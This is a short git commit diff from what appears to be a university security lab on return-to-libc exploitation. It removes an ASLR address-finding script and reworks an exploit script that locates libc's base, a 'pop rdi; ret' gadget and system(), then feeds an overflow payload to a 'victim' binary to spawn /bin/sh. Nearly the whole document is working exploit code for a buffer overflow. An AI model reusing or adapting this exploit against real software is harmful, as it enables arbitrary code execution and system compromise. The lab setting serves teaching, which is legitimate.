98d5f0ef82af954e1edbbe9b30d19afb9353d747
root <root@localhost.localdomain>
2016-10-23 12:03:31 +0000

    ca marche

--- crypto.stanford.edu/aslr-addr.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-
-sp=`ps --no-header -C victim -o esp`
-a=`printf %016x $((0x7fff$sp+184))`
-echo $a
--- crypto.stanford.edu/get-element.sh
+++ crypto.stanford.edu/get-element.sh
@@ -3,7 +3,7 @@
 echo Récupération adresse de libc ...
 libc=/lib/x86_64-linux-gnu/libc.so.6
 
-base=0x$(setarch `arch` -R ./findbase | grep -m1 libc | cut -f1 -d' ')
+base=0x$(setarch `arch` -R ./findbase.out | grep -m1 libc | cut -f1 -d' ')
 echo ...base : $base
 
 gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
@@ -12,9 +12,14 @@ echo ...offset gadget : $gadget
 system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
 echo ...system : $system
 
-addr=$(echo | setarch $(arch) -R ./victim | sed 1q)
+addr=$(echo | setarch $(arch) -R ./victim.out | sed 1q)
 echo ...name[64] : $addr
 
 echo "Attaque !"
-(echo -n 2f62696e2f7368; printf %0130d 0; printf %016x $((base+gadget)) | tac -rs..; printf %016x $((addr)) | tac -rs..; printf %016x $((base+system)) | tac -rs..) | xxd -r -p | cat
+(((
+printf %0144d 0; 
+printf %016x $((base+gadget)) | tac -rs..; 
+printf %016x $((addr +0x60)) | tac -rs..; 
+printf %016x $((base+system)) | tac -rs.. ; 
+echo -n /bin/sh | xxd -p) | xxd -r -p) ; cat) | setarch `arch` -R ./victim.out
 
